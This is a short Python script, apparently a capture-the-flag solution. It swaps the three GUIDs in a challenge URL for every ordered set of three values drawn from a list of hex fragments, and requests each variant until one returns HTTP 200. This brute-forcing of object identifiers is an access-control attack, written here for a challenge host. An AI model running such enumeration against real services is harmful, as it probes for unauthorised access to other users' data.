import re
import requests
import itertools

# Original URL with 3 GUIDs
original_url = "https://target-flask.chals.io/vendor/salesforce/tuvok/bbc7f740-3d44-439a-8181-fbf9c0976f16/d83dc86b-9a7c-475c-8379-1fc656fc4dd7?v=d03a70ea-0ed5-4bdf-b299-6bdaf3f4a38e&b=1969-07-22"

# Replacement values
values = [
    "5cfea3",       # name
    "d6c97d",       # surname
    "d0f5af22fb",   # user-id
    "387835",       # state
    "59a95",        # zip
    "19ebb9",       # street
    "5c599a",       # city
    "7be54a88fa"    # address-id
]

# Find all GUIDs in the URL
guids = re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", original_url)

if len(guids) != 3:
    print(f"Expected 3 GUIDs in the URL, found {len(guids)}. Exiting.")
    exit()

# Generate all permutations of 3 distinct values from the list
combinations = itertools.permutations(values, 3)

# Try each combination
for combo in combinations:
    test_url = original_url
    for old, new in zip(guids, combo):
        test_url = test_url.replace(old, new)

    print(f"Trying URL: {test_url}")
    try:
        response = requests.get(test_url)
        print(f"Response Body: {response.text.strip()}")
        print(f"Status Code: {response.status_code}\n")
        if response.status_code == 200:
            print("✅ Success! Found working URL.")
            break
    except Exception as e:
        print(f"Error requesting {test_url}: {e}")
